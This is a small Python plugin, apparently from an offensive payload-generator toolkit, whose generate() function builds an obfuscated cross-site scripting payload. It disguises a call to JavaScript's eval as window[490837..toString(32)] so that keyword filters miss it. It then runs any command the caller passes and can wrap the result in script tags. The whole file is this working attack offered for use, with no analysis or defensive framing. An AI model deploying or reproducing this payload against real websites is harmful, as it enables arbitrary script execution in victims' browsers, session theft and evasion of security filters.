"""My favorite XSS gh0s7 payload to run basically anything."""

from __future__ import annotations

__all__ = ["PLUGIN", "generate"]

PLUGIN = {
    "api_version": "1",
    "type": "generator",
    "kind": "xss_gh0s7",
    "entrypoint": "generate",
    "summary": "gh0s7 XSS payload to execute commands.",
    "requires_python": [],
    "requires_system": [],
}


def generate(
    tags: bool = False,
    command: str | None = None,
) -> str:
    """
    gh0s7 XSS payload to execute commands.

    Author: @gh0s7

    Params:
    - tags: If true, wrap the payload in <script></script> tags.
    - command: Optional but if you pass it, it will auto execute the command.

    Returns:
    - Rendered payload string.
    """
    gh0s7 = "var fn=window[490837..toString(1<<5)];"
    if command:
        gh0s7 = f"{gh0s7}fn('{command}')"
    if tags:
        gh0s7 = f"<script>{gh0s7}</script>"
    return gh0s7
